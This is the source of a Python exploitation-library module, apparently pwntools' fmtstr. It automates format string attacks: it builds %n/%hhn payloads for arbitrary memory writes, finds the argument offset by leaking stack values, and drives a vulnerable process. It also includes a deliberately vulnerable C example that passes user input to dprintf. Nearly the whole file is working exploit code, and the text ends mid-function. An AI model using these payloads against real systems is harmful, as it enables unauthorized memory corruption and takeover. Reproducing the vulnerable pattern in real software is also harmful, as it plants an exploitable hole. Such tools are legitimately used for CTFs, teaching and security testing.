r"""
Provide some tools to exploit format string bug

Let's use this program as an example:

::

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/mman.h>
    #define MEMORY_ADDRESS ((void*)0x11111000)
    #define MEMORY_SIZE 1024
    #define TARGET ((int *) 0x11111110)
    int main(int argc, char const *argv[])
    {
           char buff[1024];
           void *ptr = NULL;
           int *my_var = TARGET;
           ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
           if(ptr != MEMORY_ADDRESS)
           {
                   perror("mmap");
                   return EXIT_FAILURE;
           }
           *my_var = 0x41414141;
           write(1, &my_var, sizeof(int *));
           scanf("%s", buff);
           dprintf(2, buff);
           write(1, my_var, sizeof(int));
           return 0;
    }

We can automate the exploitation of the process like so:

    >>> program = pwnlib.data.elf.fmtstr.get('i386')
    >>> def exec_fmt(payload):
    ...     p = process(program)
    ...     p.sendline(payload)
    ...     return p.recvall()
    ...
    >>> autofmt = FmtStr(exec_fmt)
    >>> offset = autofmt.offset
    >>> p = process(program, stderr=PIPE)
    >>> addr = unpack(p.recv(4))
    >>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
    >>> p.sendline(payload)
    >>> print(hex(unpack(p.recv(4))))
    0x1337babe

Example - Payload generation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: python

    # we want to do 3 writes
    writes = {0x08041337:   0xbfffffff,
              0x08041337+4: 0x1337babe,
              0x08041337+8: 0xdeadbeef}

    # the printf() call already writes some bytes
    # for example :
    # strcat(dest, "blabla :", 256);
    # strcat(dest, your_input, 256);
    # printf(dest);
    # Here, numbwritten parameter must be 8
    payload = fmtstr_payload(5, writes, numbwritten=8)

Example - Automated exploitation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: python

	# Assume a process that reads a string
	# and gives this string as the first argument
	# of a printf() call
	# It do this indefinitely
	p = process('./vulnerable')

	# Function called in order to send a payload
	def send_payload(payload):
		log.info("payload = %s" % repr(payload))
		p.sendline(payload)
		return p.recv()

	# Create a FmtStr object and give to him the function
	format_string = FmtStr(execute_fmt=send_payload)
	format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
	format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
	format_string.execute_writes()

"""
from __future__ import division

import logging
import re
from operator import itemgetter
from six.moves import range
from sortedcontainers import SortedList

from pwnlib.log import getLogger
from pwnlib.memleak import MemLeak
from pwnlib.util.cyclic import *
from pwnlib.util.fiddling import randoms
from pwnlib.util.packing import *

log = getLogger(__name__)

SPECIFIER = {
    1: 'hhn',
    2: 'hn',
    4: 'n',
    8: 'lln',
}


SZMASK = { sz: (1 << (sz * 8)) - 1 for sz in SPECIFIER }

WRITE_SIZE = {
    "byte": 1,
    "short": 2,
    "int": 4,
    "long": 8,
}

def normalize_writes(writes):
    r"""
    This function converts user-specified writes to a dict ``{ address1: data1, address2: data2, ... }``
    such that all values are raw bytes and consecutive writes are merged to a single key.

    Examples:
        >>> context.clear(endian="little", bits=32)
        >>> normalize_writes({0x0: [p32(0xdeadbeef)], 0x4: p32(0xf00dface), 0x10: 0x41414141})
        [(0, b'\xef\xbe\xad\xde\xce\xfa\r\xf0'), (16, b'AAAA')]
    """
    # make all writes flat
    writes = { address: flat(data) for address, data in writes.items() }

    # merge adjacent writes (and detect overlaps)
    merged = []
    prev_end = -1
    for address, data in sorted(writes.items(), key=itemgetter(0)):
        if address < prev_end:
            raise ValueError("normalize_writes(): data at offset %d overlaps with previous data which ends at offset %d" % (address, prev_end))

        if address == prev_end and merged:
            merged[-1] = (merged[-1][0], merged[-1][1] + data)
        else:
            merged.append((address, data))

        prev_end = address + len(data)

    return merged

# optimization examples (with bytes_written=0)
#
# 00 05 00 00     -> %n%5c%n
# 00 00 05 00 00  -> %n%5c%n
# 00 00 05 05 00 05  -> need overlapping writes if numbwritten > 5

class AtomWrite(object):
    """
    This class represents a write action that can be carried out by a single format string specifier.

    Each write has an address (start), a size and the integer that should be written.

    Additionally writes can have a mask to specify which bits are important.
    While the write always overwrites all bytes in the range [start, start+size) the mask sometimes allows more
    efficient execution. For example, assume the current format string counter is at 0xaabb and a write with
    with integer = 0xaa00 and mask = 0xff00 needs to be executed. In that case, since the lower byte is not covered
    by the mask, the write can be directly executed with a %hn sequence (so we will write 0xaabb, but that is ok
    because the mask only requires the upper byte to be correctly written).
    """
    __slots__ = ( "start", "size", "integer", "mask" )

    def __init__(self, start, size, integer, mask=None):
        if mask is None:
            mask = (1 << (8 * size)) - 1
        self.start = int(start)
        self.size = size
        self.integer = int(integer)
        self.mask = int(mask)

    def __len__(self):
        return self.size

    def __key(self):
        return (self.start, self.size, self.integer, self.mask)

    def __eq__(self, other):
        if not isinstance(other, AtomWrite):
            raise TypeError("comparision not supported between instances of '%s' and '%s'" % (type(self), type(other)))
        return self.__key() == other.__key()

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.__key())

    def __repr__(self):
        return "AtomWrite(start=%d, size=%d, integer=%#x, mask=%#x)" % (self.start, self.size, self.integer, self.mask)

    @property
    def bitsize(self):
        return self.size * 8

    @property
    def end(self):
        return self.start + self.size

    def compute_padding(self, counter):
        """
        This function computes the least amount of padding necessary to execute this write,
        given the current format string write counter (how many bytes have been written until now).

        Examples:
            >>> hex(pwnlib.fmtstr.AtomWrite(0x0, 0x2, 0x2345).compute_padding(0x1111))
            '0x1234'
            >>> hex(pwnlib.fmtstr.AtomWrite(0x0, 0x2, 0xaa00).compute_padding(0xaabb))
            '0xff45'
            >>> hex(pwnlib.fmtstr.AtomWrite(0x0, 0x2, 0xaa00, 0xff00).compute_padding(0xaabb)) # with mask
            '0x0'
        """
        wanted = self.integer & self.mask
        padding = 0
        while True:
            diff = wanted ^ ((counter + padding) & self.mask)
            if not diff: break
            # this masks the least significant set bit and adds it to padding
            padding += diff & (diff ^ (diff - 1))
        return padding

    def replace(self, start=None, size=None, integer=None, mask=None):
        """
        Return a new write with updated fields (everything that is not None is set to the new value)
        """
        start = self.start if start is None else start
        size = self.size if size is None else size
        integer = self.integer if integer is None else integer
        mask = self.mask if mask is None else mask
        return AtomWrite(start, size, integer, mask)

    def union(self, other):
        """
        Combine adjacent writes into a single write.

        Example:
            >>> context.clear(endian = "little")
            >>> pwnlib.fmtstr.AtomWrite(0x0, 0x1, 0x1, 0xff).union(pwnlib.fmtstr.AtomWrite(0x1, 0x1, 0x2, 0x77))
            AtomWrite(start=0, size=2, integer=0x201, mask=0x77ff)
        """
        assert other.start == self.end, "writes to combine must be continous"
        if context.endian == "little":
            newinteger = (other.integer << self.bitsize) | self.integer
            newmask = (other.mask << self.bitsize) | self.mask
        elif context.endian == "big":
            newinteger = (self.integer << other.bitsize) | other.integer
            newmask = (self.mask << other.bitsize) | other.mask
        return AtomWrite(self.start, self.size + other.size, newinteger, newmask)

    def __getslice__(self, i,  j):
        return self.__getitem__(slice(i, j))

    def __getitem__(self, i):
        if not isinstance(i, slice):
            if i < 0 or i >= self.size:
                raise IndexError("out of range [0, " + str(self.size) + "): " + str(i))
            i = slice(i,i+1)
        start, stop, step = i.indices(self.size)
        if step != 1:
            raise IndexError("slices with step != 1 not supported for AtomWrite")

        clip = (1 << ((stop - start) * 8)) - 1
        if context.endian == 'little':
            shift = start * 8
        elif context.endian == 'big':
            shift = (self.size - stop) * 8
        return AtomWrite(self.start + start, stop - start, (self.integer >> shift) & clip, (self.mask >> shift) & clip)

def make_atoms_simple(address, data, badbytes=frozenset()):
    """
    Build format string atoms for writing some data at a given address where some bytes are not allowed
    to appear in addresses (such as nullbytes).

    This function is simple and does not try to minimize the number of atoms. For example, if there are no
    bad bytes, it simply returns one atom for each byte:

    >>> pwnlib.fmtstr.make_atoms_simple(0x0, b"abc", set())
    [AtomWrite(start=0, size=1, integer=0x61, mask=0xff), AtomWrite(start=1, size=1, integer=0x62, mask=0xff), AtomWrite(start=2, size=1, integer=0x63, mask=0xff)]
    """
    data = bytearray(data)
    if not badbytes:
        return [AtomWrite(address + i, 1, d) for i, d in enumerate(data)]

    if any(x in badbytes for x in pack(address)):
        raise RuntimeError("impossible to avoid a bad byte in starting address %x" % address)

    i = 0
    out = []
    while i < len(data):
        candidate = AtomWrite(address + i, 1, data[i])
        while candidate.end < len(data) and any(x in badbytes for x in pack(candidate.end)):
            candidate = candidate.union(AtomWrite(candidate.end, 1, data[i + candidate.size]))

        sz = min([s for s in SPECIFIER if s >= candidate.size] + [float("inf")])
        if candidate.start + sz > len(data):
            raise RuntimeError("impossible to avoid badbytes starting after offset %d (address %x)" % (i, i + address))
        i += candidate.size
        candidate = candidate.union(AtomWrite(candidate.end, sz - candidate.size, 0, 0))
        out.append(candidate)
    return out


def merge_atoms_writesize(atoms, maxsize):
    """Merge consecutive atoms based on size.

    This function simply merges adjacent atoms as long as the merged atom's size is not larger than ``maxsize``.

    Examples:
        >>> from pwnlib.fmtstr import *
        >>> merge_atoms_writesize([AtomWrite(0, 1, 1), AtomWrite(1, 1, 1), AtomWrite(2, 1, 2)], 2)
        [AtomWrite(start=0, size=2, integer=0x101, mask=0xffff), AtomWrite(start=2, size=1, integer=0x2, mask=0xff)]
    """
    assert maxsize in SPECIFIER, "write size must be supported by printf"

    out = []
    while atoms:
        # look forward to find atoms to merge with
        best = (1, atoms[0])
        candidate = atoms[0]
        for idx, atom in enumerate(atoms[1:]):
            if candidate.end != atom.start: break

            candidate = candidate.union(atom)
            if candidate.size > maxsize: break
            if candidate.size in SPECIFIER:
                best = (idx+2, candidate)

        out += [best[1]]
        atoms[:best[0]] = []
    return out

def find_min_hamming_in_range_step(prev, step, carry, strict):
    """
    Compute a single step of the algorithm for find_min_hamming_in_range

    Arguments:
        prev(dict): results from previous iterations
        step(tuple): tuple of bounds and target value, (lower, upper, target)
        carry(int): carry means allow for overflow of the previous (less significant) byte
        strict(int): strict means allow the previous bytes to be bigger than the upper limit (limited to those bytes)
                     in lower = 0x2000, upper = 0x2100, choosing 0x21 for the upper byte is not strict because
                     then the lower bytes have to actually be smaller than or equal to 00 (0x2111 would not be in
                     range)
    Returns:
        A tuple (score, value, mask) where score equals the number of matching bytes between the returned value and target.

    Examples:
        >>> initial = {(0,0): (0,0,0), (0,1): None, (1,0): None, (1,1): None}
        >>> pwnlib.fmtstr.find_min_hamming_in_range_step(initial, (0, 0xFF, 0x1), 0, 0)
        (1, 1, 255)
        >>> pwnlib.fmtstr.find_min_hamming_in_range_step(initial, (0, 1, 1), 0, 0)
        (1, 1, 255)
        >>> pwnlib.fmtstr.find_min_hamming_in_range_step(initial, (0, 1, 1), 0, 1)
        (0, 0, 0)
        >>> pwnlib.fmtstr.find_min_hamming_in_range_step(initial, (0, 1, 0), 0, 1)
        (1, 0, 255)
        >>> repr(pwnlib.fmtstr.find_min_hamming_in_range_step(initial, (0xFF, 0x00, 0xFF), 1, 0))
        'None'
    """
    lower, upper, value = step
    carryadd = 1 if carry else 0

    valbyte = value & 0xFF
    lowbyte = lower & 0xFF
    upbyte = upper & 0xFF

    # if we can the requested byte without carry, do so
    # requiring strictness if possible is not a problem since strictness will cost at most a single byte
    # (so if we don't get our wanted byte without strictness, we may as well require it if possible)
    val_require_strict = valbyte > upbyte or valbyte == upbyte and strict
    if lowbyte + carryadd <= valbyte:
        if prev[(0, val_require_strict)]:
            prev_score, prev_val, prev_mask = prev[(0, val_require_strict)]
            return prev_score + 1, (prev_val << 8) | valbyte, (prev_mask << 8) | 0xFF

    # now, we have two options: pick the wanted byte (forcing carry), or pick something else
    # check which option is better
    lowcarrybyte = (lowbyte + carryadd) & 0xFF
    other_require_strict = lowcarrybyte > upbyte or lowcarrybyte == upbyte and strict
    other_require_carry = lowbyte + carryadd > 0xFF
    prev_for_val = prev[(1, val_require_strict)]
    prev_for_other = prev[(other_require_carry, other_require_strict)]
    if prev_for_val and (not prev_for_other or prev_for_other[0] <= prev_for_val[0] + 1):
        return prev_for_val[0] + 1, (prev_for_val[1] << 8) | valbyte, (prev_for_val[2] << 8) | 0xFF
    if prev_for_other:
        return prev_for_other[0], (prev_for_other[1] << 8) | lowcarrybyte, (prev_for_other[2] << 8)
    return None

def find_min_hamming_in_range(maxbytes, lower, upper, target):
    """
    Find the value which differs in the least amount of bytes from the target and is in the given range.

    Returns a tuple (count, value, mask) where count is the number of equal bytes and mask selects the equal bytes.
    So mask & target == value & target and lower <= value <= upper.

    Arguments:
        maxbytes(int): bytes above maxbytes (counting from the least significant first) don't need to match
        lower(int): lower bound for the returned value, inclusive
        upper(int): upper bound, inclusive
        target(int): the target value that should be approximated

    Examples:
        >>> pp = lambda svm: (svm[0], hex(svm[1]), hex(svm[2]))
        >>> pp(pwnlib.fmtstr.find_min_hamming_in_range(1, 0x0, 0x100, 0xaa))
        (1, '0xaa', '0xff')
        >>> pp(pwnlib.fmtstr.find_min_hamming_in_range(1, 0xbb, 0x100, 0xaa))
        (0, '0xbb', '0x0')
        >>> pp(pwnlib.fmtstr.find_min_hamming_in_range(1, 0xbb, 0x200, 0xaa))
        (1, '0x1aa', '0xff')
        >>> pp(pwnlib.fmtstr.find_min_hamming_in_range(2, 0x0, 0x100, 0xaa))
        (2, '0xaa', '0xffff')
        >>> pp(pwnlib.fmtstr.find_min_hamming_in_range(4, 0x1234, 0x10000, 0x0))
        (3, '0x10000', '0xff00ffff')
    """
    steps = []
    for _ in range(maxbytes):
        steps += [(lower, upper, target)]
        lower = lower >> 8
        upper = upper >> 8
        target = target >> 8

    # the initial state
    prev = {
        (False,False): (0, 0, 0),
        (False,True): None if upper == lower else (0, lower, 0),
        (True,False): None if upper == lower else (0, lower, 0),
        (True,True): None if upper <= lower + 1 else (0, lower + 1, 0)
    }
    for step in reversed(steps):
        prev = {
            (carry, strict): find_min_hamming_in_range_step(prev, step, carry, strict )
            for carry in [False, True]
            for strict in [False, True]
        }
    return prev[(False,False)]
#
# what we don't do:
#  - create new atoms that cannot be created by merging existing atoms
#  - optimize based on masks
def merge_atoms_overlapping(atoms, sz, szmax, numbwritten, overflows):
    """
    Takes a list of atoms and merges consecutive atoms to reduce the number of atoms.
    For example if you have two atoms ``AtomWrite(0, 1, 1)`` and ``AtomWrite(1, 1, 1)``
    they can be merged into a single atom ``AtomWrite(0, 2, 0x0101)`` to produce a short format string.

    Arguments:
        atoms(list): list of atoms to merge
        sz(int): basic write size in bytes. Atoms of this size are generated without constraints on their values.
        szmax(int): maximum write size in bytes. No atoms with a size larger than this are generated.
        numbwritten(int): the value at which the counter starts
        overflows(int): how many extra overflows (of size sz) to tolerate to reduce the number of atoms

    Examples:
        >>> from pwnlib.fmtstr import *
        >>> merge_atoms_overlapping([AtomWrite(0, 1, 1), AtomWrite(1, 1, 1)], 2, 8, 0, 1)
        [AtomWrite(start=0, size=2, integer=0x101, mask=0xffff)]
        >>> merge_atoms_overlapping([AtomWrite(0, 1, 1), AtomWrite(1, 1, 1)], 1, 8, 0, 1) # not merged since it causes an extra overflow of the 1-byte counter
        [AtomWrite(start=0, size=1, integer=0x1, mask=0xff), AtomWrite(start=1, size=1, integer=0x1, mask=0xff)]
        >>> merge_atoms_overlapping([AtomWrite(0, 1, 1), AtomWrite(1, 1, 1)], 1, 8, 0, 2)
        [AtomWrite(start=0, size=2, integer=0x101, mask=0xffff)]
        >>> merge_atoms_overlapping([AtomWrite(0, 1, 1), AtomWrite(1, 1, 1)], 1, 1, 0, 2) # not merged due to szmax
        [AtomWrite(start=0, size=1, integer=0x1, mask=0xff), AtomWrite(start=1, size=1, integer=0x1, mask=0xff)]
    """
    if not szmax:
        szmax = max(SPECIFIER.keys())

    assert 1 <= overflows, "must allow at least one overflow"
    assert sz <= szmax, "sz must be smaller or equal to szmax"

    maxwritten = numbwritten + (1 << (8 * sz)) * overflows
    done = [False for _ in atoms]

    numbwritten_at = [numbwritten for _ in atoms]
    out = []
    for idx, atom in enumerate(atoms):
        if done[idx]: continue
        numbwritten_here = numbwritten_at[idx]

        # greedily find the best possible write at the current offset
        # the best write is the one which sets the largest number of target
        # bytes correctly
        candidate = AtomWrite(atom.start, 0, 0)
        best = (0, None)
        for nextidx, nextatom in enumerate(atoms[idx:], idx):
            # if there is no atom immediately following the current candidate
            # that we haven't written yet, stop
            if done[nextidx] or candidate.end != nextatom.start:
                break

            # extend the candidate with the next atom.
            # check that we are still within the limits and that the candidate
            # can be written with a format specifier (this excludes non-power-of-2 candidate sizes)
            candidate = candidate.union(nextatom)
            if candidate.size not in SPECIFIER: continue
            if candidate.size > szmax: break

            # now approximate the candidate if it is larger than the always allowed size (sz),
            # taking the `maxwritten` constraint into account
            # this ensures that we don't write more than `maxwritten` bytes
            approxed = candidate
            score = candidate.size
            if approxed.size > sz:
                score, v, m = find_min_hamming_in_range(approxed.size, numbwritten_here, maxwritten, approxed.integer)
                approxed = candidate.replace(integer=v, mask=m)

            # if the current candidate sets more bytes correctly, save it
            if score > best[0]:
                best = (score, nextidx, approxed)

        _, nextidx, best_candidate = best
        numbwritten_here += best_candidate.compute_padding(numbwritten_here)
        offset = 0

        # for all atoms that we merged, check if all bytes are written already to update `done``
        # also update the numbwritten_at for all the indices covered by the current best_candidate
        for i, iatom in enumerate(atoms[idx:nextidx+1], idx):
            shift = iatom.size

            # if there are no parts in the atom's that are not written by the candidate,
            # mark it as done
            if not (iatom.mask & (~best_candidate[offset:offset+shift].mask)):
                done[i] = True
            else:
                # numbwritten_at is only relevant for atoms that aren't done yet,
                # so update it only in that case (done atoms are never processed again)
                numbwritten_at[i] = max(numbwritten_at[i], numbwritten_here)

            offset += shift

        # emit the best candidate
        out += [best_candidate]
    return out

def overlapping_atoms(atoms):
    """
    Finds pairs of atoms that write to the same address.

    Basic examples:
        >>> from pwnlib.fmtstr import *
        >>> list(overlapping_atoms([AtomWrite(0, 2, 0), AtomWrite(2, 10, 1)])) # no overlaps
        []
        >>> list(overlapping_atoms([AtomWrite(0, 2, 0), AtomWrite(1, 2, 1)])) # single overlap
        [(AtomWrite(start=0, size=2, integer=0x0, mask=0xffff), AtomWrite(start=1, size=2, integer=0x1, mask=0xffff))]

    When there are transitive overlaps, only the largest overlap is returned. For example:
        >>> list(overlapping_atoms([AtomWrite(0, 3, 0), AtomWrite(1, 4, 1), AtomWrite(2, 4, 1)]))
        [(AtomWrite(start=0, size=3, integer=0x0, mask=0xffffff), AtomWrite(start=1, size=4, integer=0x1, mask=0xffffffff)), (AtomWrite(start=1, size=4, integer=0x1, mask=0xffffffff), AtomWrite(start=2, size=4, integer=0x1, mask=0xffffffff))]

    Even though ``AtomWrite(0, 3, 0)`` and ``AtomWrite(2, 4, 1)`` overlap as well that overlap is not returned
    as only the largest overlap is returned.
    """
    prev = None
    for atom in sorted(atoms, key=lambda a: a.start):
        if not prev:
            prev = atom
            continue
        if prev.end > atom.start:
            yield prev, atom
        if atom.end > prev.end:
            prev = atom

class AtomQueue(object):
    def __init__(self, numbwritten):
        self.queues = { sz: SortedList(key=lambda atom: atom.integer) for sz in SPECIFIER.keys() }
        self.positions = { sz: 0 for sz in SPECIFIER }
        self.numbwritten = numbwritten

    def add(self, atom):
        self.queues[atom.size].add(atom)
        if atom.integer & SZMASK[atom.size] < self.numbwritten & SZMASK[atom.size]:
            self.positions[atom.size] += 1

    def pop(self):
        # find queues that still have items left
        active_sizes = [ sz for sz,p in self.positions.items() if p < len(self.queues[sz]) ]

        # if all queues are exhausted, reset the one for the lowest size atoms
        # resetting a queue means the counter overflows (for this size)
        if not active_sizes:
            try:
                sz_reset = min(sz for sz,q in self.queues.items() if q)
            except ValueError:
                # all queues are empty, so there are no atoms left
                return None

            self.positions[sz_reset] = 0
            active_sizes = [sz_reset]

        # find the queue that requires the least amount of counter change
        best_size = min(active_sizes, key=lambda sz: self.queues[sz][self.positions[sz]].compute_padding(self.numbwritten))
        best_atom = self.queues[best_size].pop(self.positions[best_size])
        self.numbwritten += best_atom.compute_padding(self.numbwritten)

        return best_atom

def sort_atoms(atoms, numbwritten):
    """
    This function sorts atoms such that the amount by which the format string counter has to been increased
    between consecutive atoms is minimized.

    The idea is to reduce the amount of data the the format string has to output to write the desired atoms.
    For example, directly generating a format string for the atoms ``[AtomWrite(0, 1, 0xff), AtomWrite(1, 1, 0xfe)]``
    is suboptimal: we'd first need to output 0xff bytes to get the counter to 0xff and then output 0x100+1 bytes to
    get it to 0xfe again. If we sort the writes first we only need to output 0xfe bytes and then 1 byte to get to 0xff.

    Arguments:
        atoms(list): list of atoms to sort
        numbwritten(int): the value at which the counter starts

    Examples:
        >>> from pwnlib.fmtstr import *
        >>> sort_atoms([AtomWrite(0, 1, 0xff), AtomWrite(1, 1, 0xfe)], 0) # the example described above
        [AtomWrite(start=1, size=1, integer=0xfe, mask=0xff), AtomWrite(start=0, size=1, integer=0xff, mask=0xff)]
        >>> sort_atoms([AtomWrite(0, 1, 0xff), AtomWrite(1, 1, 0xfe)], 0xff) # if we start with 0xff it's different
        [AtomWrite(start=0, size=1, integer=0xff, mask=0xff), AtomWrite(start=1, size=1, integer=0xfe, mask=0xff)]
    """
    # find dependencies
    #
    # in this phase, we determine for which writes we need to preserve order to ensure correctness
    # for example, if we have atoms [a, b] as input and b writes to the same address as a, we cannot reorder that
    # to [b, a] since then a would overwrite parts of what b wrote.
    #
    # a depends on b means: a must happen after b --> depgraph[a] contains b
    order = { atom: i for i,atom in enumerate(atoms) }

    depgraph = { atom: set() for atom in atoms }
    rdepgraph = { atom: set() for atom in atoms }
    for atom1,atom2 in overlapping_atoms(atoms):
        if order[atom1] < order[atom2]:
            depgraph[atom2].add(atom1)
            rdepgraph[atom1].add(atom2)
        else:
            depgraph[atom1].add(atom2)
            rdepgraph[atom2].add(atom1)

    queue = AtomQueue(numbwritten)

    for atom, deps in depgraph.items():
        if not deps:
            queue.add(atom)

    out = []
    while True:
        atom = queue.pop()
        if not atom: # we are done
            break

        out.append(atom)

        # add all atoms that now have no dependencies anymore to the queue
        for dep in rdepgraph.pop(atom):
            if atom not in depgraph[dep]:
                continue
            depgraph[dep].discard(atom)
            if not depgraph[dep]:
                queue.add(dep)

    return out

def make_payload_dollar(data_offset, atoms, numbwritten=0, countersize=4):
    r'''
    Makes a format-string payload using glibc's dollar syntax to access the arguments.

    Returns:
        A tuple (fmt, data) where ``fmt`` are the format string instructions and data are the pointers
        that are accessed by the instructions.

    Arguments:
        data_offset(int): format string argument offset at which the first pointer is located
        atoms(list): list of atoms to execute
        numbwritten(int): number of byte already written by the printf function
        countersize(int): size in bytes of the format string counter (usually 4)

    Examples:
        >>> pwnlib.fmtstr.make_payload_dollar(1, [pwnlib.fmtstr.AtomWrite(0x0, 0x1, 0xff)])
        (b'%255c%1$hhn', b'\x00\x00\x00\x00')
    '''
    data = b""
    fmt = ""

    counter = numbwritten
    for idx, atom in enumerate(atoms):
        # set format string counter to correct value
        padding = atom.compute_padding(counter)
        counter = (counter + padding) % (1 << (countersize * 8))
        if countersize == 32 and counter > 2147483600:
            log.warn("number of written bytes in format string close to 1 << 31. this will likely not work on glibc")
        if padding >= (1 << (countersize*8-1)):
            log.warn("padding is negative, this will not work on glibc")

        # perform write
        if padding:
            fmt += "%" + str(padding) + "c"
        fmt += "%" + str(data_offset + idx) + "$" + SPECIFIER[atom.size]
        data += pack(atom.start)

    return fmt.encode(), data

def make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes):
    """
    Builds an optimized list of atoms for the given format string payload parameters.
    This function tries to optimize two things:

    - use the fewest amount of possible atoms
    - sort these atoms such that the amount of padding needed between consecutive elements is small

    Together this should produce short format strings.

    Arguments:
        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
        sz(int): basic write size in bytes. Atoms of this size are generated without constraints on their values.
        szmax(int): maximum write size in bytes. No atoms with a size larger than this are generated (ignored for strategy 'fast')
        numbwritten(int): number of byte already written by the printf function
        overflows(int): how many extra overflows (of size sz) to tolerate to reduce the length of the format string
        strategy(str): either 'fast' or 'small'
        badbytes(str): bytes that are not allowed to appear in the payload
    """
    all_atoms = []
    for address, data in normalize_writes(writes):
        atoms = make_atoms_simple(address, data, badbytes)
        if strategy == 'small':
            atoms = merge_atoms_overlapping(atoms, sz, szmax, numbwritten, overflows)
        elif strategy == 'fast':
            atoms = merge_atoms_writesize(atoms, sz)
        else:
            raise ValueError("strategy must be either 'small' or 'fast'")
        atoms = sort_atoms(atoms, numbwritten)
        all_atoms += atoms
    return all_atoms

def fmtstr_split(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy="small", badbytes=frozenset()):
    """
    Build a format string like fmtstr_payload but return the string and data separately.
    """
    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    if write_size_max not in ['byte', 'short', 'int', 'long']:
        log.error("write_size_max must be 'byte', 'short', 'int' or 'long'")

    sz = WRITE_SIZE[write_size]
    szmax = WRITE_SIZE[write_size_max]
    atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)

    return make_payload_dollar(offset, atoms, numbwritten)

def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy="small", badbytes=frozenset(), offset_bytes=0):
    r"""fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str

    Makes payload with given parameter.
    It can generate payload for 32 or 64 bits architectures.
    The size of the addr is taken from ``context.bits``

    The overflows argument is a format-string-length to output-amount tradeoff:
    Larger values for ``overflows`` produce shorter format strings that generate more output at runtime.

    Arguments:
        offset(int): the first formatter's offset you control
        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
        numbwritten(int): number of byte already written by the printf function
        write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
        overflows(int): how many extra overflows (at size sz) to tolerate to reduce the length of the format string
        strategy(str): either 'fast' or 'small' ('small' is default, 'fast' can be used if there are many writes)
    Returns:
        The payload in order to do needed writes

    Examples:
        >>> context.clear(arch = 'amd64')
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
        b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
        b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
        b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        >>> context.clear(arch = 'i386')
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
        b'%322419390c%5$na\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
        b'%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
        b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')
        b'%1c%3$na\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')
        b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'
    """
    sz = WRITE_SIZE[write_size]
    szmax = WRITE_SIZE[write_size_max]
    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)

    fmt = b""
    for _ in range(1000000):
        data_offset = (offset_bytes + len(fmt)) // context.bytes
        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten)
        fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)

        if len(fmt) + offset_bytes == data_offset * context.bytes:
            break
    else:
        raise RuntimeError("this is a bug ... format string building did not converge")

    return fmt + data

class FmtStr(object):
    """
    Provides an automated format string exploitation.

    It takes a function which is called every time the automated
    process want to communicate with the vulnerable process. this
    function takes a parameter with the payload that you have to
    send to the vulnerable process and must return the process
    returns.

    If the `offset` parameter is not given, then try to find the right
    offset by leaking stack data.

    Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes

    """

    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0):
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten

        if self.offset is None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

    def leak_stack(self, offset, prefix=b""):
        payload = b"START%%%d$pEND" % offset
        leak = self.execute_fmt(prefix + payload)
        try:
            leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak

    def find_offset(self):
        marker = cyclic(20)
        for off in range(1,1000):
            leak = self.leak_stack(off, marker)
            leak = pack(leak)

            pad = cyclic_find(leak[:4])
            if pad >= 0 and pad < 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None

    def _leaker(self, addr):
        # Hack: elfheaders often start at offset 0 in a page,
        # but we often can't leak addresses containing null bytes,
        # and the page below elfheaders is often not mapped.
